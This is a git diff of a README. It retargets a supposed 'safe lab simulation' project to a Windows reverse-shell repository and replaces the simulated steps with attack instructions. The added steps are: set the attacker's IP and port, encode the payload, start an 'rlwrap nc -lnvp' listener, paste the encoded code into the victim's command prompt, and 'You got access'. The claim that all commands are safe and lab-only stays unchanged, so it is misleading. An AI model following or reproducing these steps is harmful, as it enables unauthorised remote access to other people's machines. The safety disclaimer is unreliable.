@@ -25,7 +25,7 @@ By using this repository, you confirm that you comply with all **local laws and 
 1. **Clone this repository:**
 
 ```bash
-git clone https://github.com/username/safe-lab-sim.git
+git clone https://github.com/darkphantom-gamer/windows-reverse-shell
 cd safe-lab-sim
 ```
 
@@ -37,12 +37,6 @@ source venv/bin/activate   # Linux / Mac
 venv\Scripts\activate      # Windows
 ```
 
-3. **Install dependencies:**
-
-```bash
-pip install -r requirements.txt
-```
-
 ---
 
 ## 🛠️ Usage (Safe Lab Simulation)
@@ -50,14 +44,19 @@ pip install -r requirements.txt
 1. **Simulate Python encoding workflow:**
 
 ```bash
-python encode.py --input sample_script.py --output encoded_script.py
+change the ip and port to your requirements
+python encode.py 
 ```
 
-2. **Simulate a network listener (safe local simulation):**
+2. **Setup a netcat Listner ( Rlwrap is required here):**
 
 ```bash
-python simulate_listener.py --port 9000
+rlwrap nc -lnvp <port>
 ```
+
+3. **Paste the ecoded code into victim command prompt ( It will not work in powershell)**
+
+4. ** You got access**
 
 > All commands are **safe**, local, and intended for **lab simulations only**.
 
